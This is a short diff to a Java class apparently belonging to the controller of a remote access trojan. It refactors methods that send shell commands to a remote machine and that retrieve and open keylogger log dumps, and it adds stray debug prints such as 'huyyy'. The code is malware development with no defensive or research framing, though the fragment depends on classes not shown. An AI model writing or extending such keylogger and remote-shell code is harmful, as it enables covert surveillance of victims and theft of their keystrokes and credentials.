@@ -201,7 +201,7 @@ public class Streams {
 
     public String sendAndReadAction(Shell action, String command) throws IOException {
         if (action == Shell.COMMAND) {
-            sendSize(11);
+            mainStream.sendSize(11);
             sendString(command);
             return readString();
         }
@@ -251,13 +251,12 @@ public class Streams {
         }
     }
 
-    public void sendAction(KeyloggerEvents event) throws IOException {
-        String nameOfSession = getSessionFolder() + "/" + "/KeyLogger Logs/" + new Time().getTime();
+    public void sendAction(KeyloggerEvents event, String nameOfSession) throws IOException {
+        System.out.println(event);
         switch (event) {
-            case START -> mainStream.sendSize(12);
-            case STOP -> mainStream.sendSize(13);
             case DUMP_LAST -> {
-                sendSize(4);
+                System.out.println("huyyy");
+                mainStream.sendSize(4);
                 if (readSize()!=-1) {
                     receiveFile(nameOfSession);
                     FolderOpener.open(nameOfSession);
@@ -291,10 +290,6 @@ public class Streams {
 
     public boolean sendAndReadAction(KeyloggerEvents event) throws IOException {
         switch (event) {
-            case STATE -> {
-                sendSize(15);
-                return (readSize() != 0);
-            }
             case CHECK_LAST -> {
                 sendSize(1403);
                 return (readSize() != 0);
